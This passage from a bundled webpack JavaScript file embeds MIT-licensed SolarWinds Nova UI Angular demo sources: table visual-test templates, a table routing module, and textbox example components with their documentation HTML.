id="table-custom-action"\n        ></nui-table-columns-add-remove-example>\n    </details>\n\n    <details open>\n        <summary id="nui-visual-table-column-size-summary">\n            Column resize\n        </summary>\n        <nui-table-resize-example\n            id="table-resizing"\n        ></nui-table-resize-example>\n    </details>\n\n    <details open>\n        <summary id="nui-visual-table-row-selection-summary">\n            Row selection in table\n        </summary>\n        <nui-table-select id="table-selected-row"></nui-table-select>\n    </details>\n\n    <details open>\n        <summary id="nui-visual-table-select-pinned-header-summary">\n            Select Pinned Header\n        </summary>\n        <nui-table-select-pinned-header-example\n            id="table-select-pinned-header"\n        ></nui-table-select-pinned-header-example>\n    </details>\n\n    <details open>\n        <summary id="nui-visual-table-virtual-scroll-sticky-header-summary">\n            Virtual Scroll Sticky Header\n        </summary>\n        <nui-table-virtual-scroll-sticky-header-test-example></nui-table-virtual-scroll-sticky-header-test-example>\n    </details>\n</div>\n'},84134:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "table-visual-test-example",\n    templateUrl: "./table-visual-test.example.html",\n})\nexport class TableVisualTestComponent {}\n'},54911:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ScrollingModule } from "@angular/cdk/scrolling";\nimport { DatePipe } from "@angular/common";\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiCheckboxModule,\n    NuiDividerModule,\n    NuiDocsModule,\n    NuiExpanderModule,\n    NuiIconModule,\n    NuiMenuModule,\n    NuiMessageModule,\n    NuiPaginatorModule,\n    NuiProgressModule,\n    NuiSearchModule,\n    NuiSpinnerModule,\n    NuiSwitchModule,\n    NuiTableModule,\n    NuiTextboxModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    TableBasicExampleComponent,\n    TableCellContentAlignComponent,\n    TableCellWidthSetExampleComponent,\n    TableColumnsAddRemoveExampleComponent,\n    TableDocsComponent,\n    TablePaginationExampleComponent,\n    TablePinnedHeaderComponent,\n    TableReorderExampleComponent,\n    TableResizeExampleComponent,\n    TableRowClickableExampleComponent,\n    TableRowHeightSetExampleComponent,\n    TableRowSelectInstructionsComponent,\n    TableSearchExampleComponent,\n    TableSearchWithSelectAndPaginationComponent,\n    TableSelectableToggleExampleComponent,\n    TableSelectExampleComponent,\n    TableSelectPinnedHeaderComponent,\n    TableSortingExampleComponent,\n    TableTestComponent,\n    TableVirtualScrollRealApiExampleComponent,\n    TableVirtualScrollRealApiMinimalistExampleComponent,\n    TableVirtualScrollRealApiProgressFooterExampleComponent,\n    TableVirtualScrollRealApiProgressTextFooterExampleComponent,\n    TableVirtualScrollSelectStickyHeaderExampleComponent,\n    TableVirtualScrollStepsAndButtonExampleComponent,\n    TableVirtualScrollStickyHeaderExampleComponent,\n    TableVirtualScrollStickyHeaderTestExampleComponent,\n    TableVisualTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: TableDocsComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "table-test",\n        component: TableTestComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n        },\n    },\n    {\n        path: "basic",\n        component: TableBasicExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "width-set",\n        component: TableCellWidthSetExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "pagination",\n        component: TablePaginationExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "search",\n        component: TableSearchExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "height",\n        component: TableRowHeightSetExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "custom-actions",\n        component: TableColumnsAddRemoveExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "sorting",\n        component: TableSortingExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "reorder",\n        component: TableReorderExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "resize",\n        component: TableResizeExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "selectable-toggle",\n        component: TableSelectableToggleExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "select",\n        component: TableSelectExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "visual-test",\n        component: TableVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "table-row-clickable",\n        component: TableRowClickableExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "virtual-1",\n        component: TableVirtualScrollRealApiExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "virtual-2",\n        component: TableVirtualScrollRealApiMinimalistExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "step",\n        component: TableVirtualScrollStepsAndButtonExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "sticky",\n        component: TableVirtualScrollStickyHeaderExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "sticky-test",\n        component: TableVirtualScrollStickyHeaderTestExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "select-sticky",\n        component: TableVirtualScrollSelectStickyHeaderExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiTableModule,\n        NuiDocsModule,\n        NuiPaginatorModule,\n        NuiSearchModule,\n        NuiSwitchModule,\n        NuiDividerModule,\n        NuiCheckboxModule,\n        NuiTextboxModule,\n        NuiMessageModule,\n        NuiExpanderModule,\n        NuiMenuModule,\n        NuiIconModule,\n        RouterModule.forChild(routes),\n        ScrollingModule,\n        NuiSpinnerModule,\n        NuiProgressModule,\n    ],\n    declarations: [\n        TableBasicExampleComponent,\n        TableCellWidthSetExampleComponent,\n        TableColumnsAddRemoveExampleComponent,\n        TableDocsComponent,\n        TablePaginationExampleComponent,\n        TablePinnedHeaderComponent,\n        TableReorderExampleComponent,\n        TableRowHeightSetExampleComponent,\n        TableRowClickableExampleComponent,\n        TableResizeExampleComponent,\n        TableSearchExampleComponent,\n        TableSelectableToggleExampleComponent,\n        TableSelectExampleComponent,\n        TableSelectPinnedHeaderComponent,\n        TableSortingExampleComponent,\n        TableCellContentAlignComponent,\n        TableTestComponent,\n        TableVisualTestComponent,\n        TableVirtualScrollRealApiExampleComponent,\n        TableVirtualScrollStepsAndButtonExampleComponent,\n        TableVirtualScrollRealApiProgressFooterExampleComponent,\n        TableVirtualScrollRealApiProgressTextFooterExampleComponent,\n        TableVirtualScrollRealApiMinimalistExampleComponent,\n        TableSearchWithSelectAndPaginationComponent,\n        TableVirtualScrollStickyHeaderExampleComponent,\n        TableVirtualScrollStickyHeaderTestExampleComponent,\n        TableVirtualScrollSelectStickyHeaderExampleComponent,\n        TableRowSelectInstructionsComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("table"),\n        },\n        DatePipe,\n    ],\n    exports: [RouterModule],\n})\nexport default class TableModule {}\n'},29421:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./textbox-docs/textbox-docs.example.component";\nexport * from "./textbox-basic/textbox-basic.example.component";\nexport * from "./textbox-disabled/textbox-disabled.example";\nexport * from "./textbox-required/textbox-required.example.component";\nexport * from "./textbox-info/textbox-info.example.component";\nexport * from "./textbox-hint/textbox-hint.example.component";\nexport * from "./textbox-placeholder/textbox-placeholder.example.component";\nexport * from "./textbox-area/textbox-area.example.component";\nexport * from "./textbox-custom-width/textbox-custom-width.example.component";\nexport * from "./textbox-readonly/textbox-readonly.example.component";\nexport * from "./textbox-visual-test/textbox-visual-test.component";\nexport * from "./textbox-number/index";\nexport * from "./textbox-getting-value/textbox-getting-value.example.component";\n'},49033:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-textbox id="demo-options-area-textbox-item" value="Text area" rows="5">\n</nui-textbox>\n'},17733:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-textbox-area-example",\n    templateUrl: "./textbox-area.example.component.html",\n})\nexport class TextboxAreaExampleComponent {}\n'},57027:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-textbox id="demo-options-textbox-item" value="example value">\n</nui-textbox>\n'},99707:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-textbox-basic-example",\n    templateUrl: "./textbox-basic.example.component.html",\n})\nexport class TextboxBasicExampleComponent {}\n'},92127:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-textbox id="demo-options-custom-width-textbox-item" customBoxWidth="200px">\n</nui-textbox>\n'},20967:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-textbox-custom-box-width-example",\n    templateUrl: "./textbox-custom-width.example.component.html",\n})\nexport class TextboxCustomBoxWidthExampleComponent {}\n'},83379:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-textbox\n    id="demo-options-disabled-textbox-item"\n    value="disabled textbox"\n    disabled="true"\n>\n</nui-textbox>\n'},58:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-textbox-disabled-example",\n    templateUrl: "./textbox-disabled.example.component.html",\n})\nexport class TextboxDisabledExampleComponent {}\n'},30201:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiTextboxModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To use the textbox component add an <code>&lt;nui-textbox&gt;</code> to your\n    template. Optionally, you can set an initial value via the\n    <code>value</code> input.\n</p>\n<nui-example-wrapper filenamePrefix="textbox-basic" exampleTitle="Basic usage">\n    <nui-textbox-basic-example></nui-textbox-basic-example>\n</nui-example-wrapper>\n\n<h2>Placeholder</h2>\n<p>\n    To add a placeholder to your textbox, set the <code>placeholder</code> input\n    to the desired string value.\n</p>\n<nui-example-wrapper\n    filenamePrefix="textbox-placeholder"\n    exampleTitle="Textbox with placeholder"\n>\n    <nui-textbox-placeholder-example></nui-textbox-placeholder-example>\n</nui-example-wrapper>\n\n<h2>Disabled</h2>\n<p>To disable the textbox, set the <code>disabled</code> input to true.</p>\n<nui-example-wrapper\n    filenamePrefix="textbox-disabled"\n    exampleTitle="Disabled textbox"\n>\n    <nui-textbox-disabled-example></nui-textbox-disabled-example>\n</nui-example-wrapper>\n\n<h2>Readonly</h2>\n<p>\n    To make the textbox readonly, set the <code>readonly</code> input to true.\n</p>\n<nui-example-wrapper\n    filenamePrefix="textbox-readonly"\n    exampleTitle="readonly textbox"\n>\n    <nui-textbox-readonly-example></nui-textbox-readonly-example>\n</nui-example-wrapper>\n\n<h2>Invalid State</h2>\n<p>\n    To manually set the textbox to an invalid value state, pass true to the\n    <code>isInErrorState</code> input. Note that this input is only about\n    styling. If a textbox with built-in validation is needed, please wrap your\n    textbox in an\n    <code\n        ><a href="../components/FormFieldComponent.html" target="_blank"\n            >&lt;nui-form-field&gt;</a\n        ></code\n    >.\n</p>\n<nui-example-wrapper\n    filenamePrefix="textbox-required"\n    exampleTitle="Required textbox"\n>\n    <nui-textbox-required-example></nui-textbox-required-example>\n</nui-example-wrapper>\n\n<h2>Adding a Hint</h2>\n<p>\n    To add a hint underneath the textbox, wrap\n    <code>&lt;nui-textbox&gt;</code> in an\n    <code>&lt;nui-form-field&gt;</code> component and set\n    <code>&lt;nui-form-field&gt;</code>\'s <code>hint</code> input to the desired\n    hint string.\n</p>\n<nui-example-wrapper\n    filenamePrefix="textbox-hint"\n    exampleTitle="Textbox with hint"\n>\n    <nui-textbox-hint-example></nui-textbox-hint-example>\n</nui-example-wrapper>\n\n<h2>Additional Info Icon</h2>\n<p>\n    To apply a hoverable "additional info" icon to the textbox, wrap\n    <code>&lt;nui-textbox&gt;</code> in an\n    <code>&lt;nui-form-field&gt;</code> component and set\n    <code>&lt;nui-form-field&gt;</code>\'s <code>info</code> input to the desired\n    info string.\n</p>\n<nui-example-wrapper\n    filenamePrefix="textbox-info"\n    exampleTitle="Textbox with additional info"\n>\n    <nui-textbox-info-example></nui-textbox-info-example>\n</nui-example-wrapper>\n\n<h2>Textarea</h2>\n<p>\n    To create a textarea set the <code>rows</code> input to the desired number\n    of textarea rows.\n</p>\n<p>\n    <b>Note:</b> To make textarea scrollable, add\n    <code>textarea-scrollable</code> class to the\n    <code>nui-textbox</code> element.\n</p>\n<nui-example-wrapper filenamePrefix="textbox-area" exampleTitle="Textarea">\n    <nui-textbox-area-example></nui-textbox-area-example>\n</nui-example-wrapper>\n\n<h2>Custom Width</h2>\n<p>\n    Textbox can have a custom width. To configure it, set the\n    <code>customBoxWidth</code> input to a css-style size value, e.g. "200px",\n    "10vw".\n</p>\n<nui-example-wrapper\n    filenamePrefix="textbox-custom-width"\n    exampleTitle="Textbox with custom box width"\n>\n    <nui-textbox-custom-box-width-example></nui-textbox-custom-box-width-example>\n</nui-example-wrapper>\n\n<h3>Getting a Value</h3>\n<p>\n    You can use binding to the <code>valueChanged</code> output (emits after\n    <strong>input</strong> was changed) to get a value from a textbox component\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="textbox-getting-value"\n    exampleTitle="Getting a Value"\n>\n    <nui-textbox-getting-value-example></nui-textbox-getting-value-example>\n</nui-example-wrapper>\n'},15637:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-textbox-docs-example",\n    templateUrl: "./textbox-docs.example.component.html",\n})\nexport class TextboxDocsExampleComponent {}\n'},85883:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<b>Accessing value using <code>textChanged</code> output</b>\n<nui-textbox value="example value" #textboxValueChangedExample> </nui-textbox>\n<p class="my-3">You typed: {{ textboxValueChangedValue }}</p>\n'},24995:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    Component,\n    ViewChild,\n} from "@angular/core";\nimport { Subject } from "rxjs";\nimport { takeUntil, tap } from "rxjs/operators";\n\nimport { TextboxComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-textbox-getting-value-example",\n    templateUrl: "./textbox-getting-value.example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TextboxGettingValueExampleComponent implements AfterViewInit {\n    public textboxValueChangedValue: string | number;\n    private destroy$: Subject<any> = new Subject<any>();\n\n    @ViewChild("textboxValueChangedExample") textbox: TextboxComponent;\n\n    public ngAfterViewInit(): void {\n        this.textbox.textChange\n            .pipe(\n                tap(\n                    (value) => (this.textboxValueChangedValue = value as string)\n                ),\n                takeUntil(this.destroy$)\n            )\n            .subscribe();\n    }\n}\n'},45565:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-form-field\n    i18n-caption\n    caption="Textbox with hint"\n    i18n-hint\n    hint="custom hint"\n>\n    <nui-textbox id="demo-options-hint-textbox-item"> </nui-textbox>\n</nui-form-field>\n'},97705:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-textbox-hint-example",\n    templateUrl: "./textbox-hint.example.component.html",\n})\nexport class TextboxHintExampleComponent {}\n'},28283:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-form-field\n    i18n-caption\n    caption="Textbox with info"\n    i18n-info\n    info="This is additional info for textbox"\n>\n    <nui-textbox id="demo-options-info-textbox-item" value="Textbox with info">\n    </nui-textbox>\n</nui-form-field>\n'},93251:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-textbox-info-example",\n    templateUrl: "./textbox-info.example.component.html",\n})\nexport class TextboxInfoExampleComponent {}\n'},89680:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, 